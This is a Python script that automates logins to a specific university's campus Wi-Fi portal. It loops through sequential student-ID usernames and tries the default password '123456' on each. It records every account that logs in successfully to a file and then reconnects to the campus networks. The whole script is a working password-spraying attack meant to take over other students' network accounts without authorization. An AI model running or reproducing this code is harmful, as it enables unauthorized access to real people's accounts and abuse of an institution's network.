import pywifi,time,socket,requests
from pywifi import const
from subprocess import check_output

# 连接WiFi
def connect_wifi(ssidd):
    wifi = pywifi.PyWiFi()  # 创建一个wifi对象
    ifaces = wifi.interfaces()[0]  # 取第一个无线网卡
    ifaces.disconnect()  # 断开网卡连接
    time.sleep(5)  # 缓冲0.5秒
    profile = pywifi.Profile()  # 配置文件
    profile.ssid = ssidd  # wifi名称
    ifaces.remove_all_network_profiles()  # 删除其他配置文件
    tmp_profile = ifaces.add_network_profile(profile)  # 加载配置文件
    ifaces.connect(tmp_profile)  # 连接
    time.sleep(5)  # 2秒能否成功连接
    isok = True
    if ifaces.status() == const.IFACE_CONNECTED:
        return True
    else:
        return False


#获取当前WiFi的SSID
def getSSID():
    scanoutput = check_output([r"showSSID.cmd"])
    x=scanoutput.decode()
    currentSSID=x[0:-2]
    return currentSSID


#获取IPv4地址
def getIP():
    hostname = socket.gethostname()
    ip =socket.gethostbyname(hostname)
    return ip


# 登录
def login_request():
    if getSSID() == "csust-yd":
        LOGIN_PAGE_URL = "http://192.168.7.221:801/eportal/?c=ACSetting&a=Login&protocol=http:&hostname=192.168.7.221&iTermType=1&wlanuserip={0:}&wlanacip=null&wlanacname=null&mac=00-00-00-00-00-00&ip={0:}&enAdvert=0&queryACIP=0&loginMethod=1".format(getIP())
    elif getSSID() == "csust-dx":
        LOGIN_PAGE_URL = "http://192.168.7.221:801/eportal/?c=ACSetting&a=Login&protocol=http:&hostname=192.168.7.221&iTermType=1&wlanuserip={0:}&wlanacip=192.168.132.254&wlanacname=JPL-ME60-1&mac=c9-cc-a2-09-15-de&ip={0:}&enAdvert=0&queryACIP=0&loginMethod=1".format(getIP())
    for i in range(12):
        for n in range (35):
            if i < 9:
                if n < 9:
                    Username = "202002140" + str(i+3) + "0" + str(n+1)
                else:
                    Username = "202002140" + str(i+3) + str(n)
            else:
                if n < 9:
                    Username = "20200214" + str(i+3) + "0" + str(n+1)
                else:
                    Username = "20200214" + str(i+3) + str(n)
            if Username in ACCS:
                continue
            Password = "123456"
            data1 = {"DDDDD": ",0," + Username,"upass": Password,"OMKKey": "123456","R1": "0","R2": "0","R3": "0", "R4": "0","para": "00"}
            try:
                for x in range(2):
                    result = requests.post(LOGIN_PAGE_URL, data = data1)
                    if "成" in result.text:
                        print(Username+"  成功   ",Password)
                        f = open("UP.txt","a+")   # 设置文件对象
                        f.write(Username + "\n")
                        f.close() # 关闭文件
                        connect_wifi("csust-dx")
                        connect_wifi("csust-lt")
                        connect_wifi("csust-yd")
                        break
                    else :
                        print(Username+"  失败   ",Password)
                        continue
                continue
            except:
                return False

try:
    f = open("UP.txt","r")   # 设置文件对象
    ACCS = f.read().splitlines()
    f.close() # 关闭文件
    login_request()
except:
    print(0)
    a = int(input())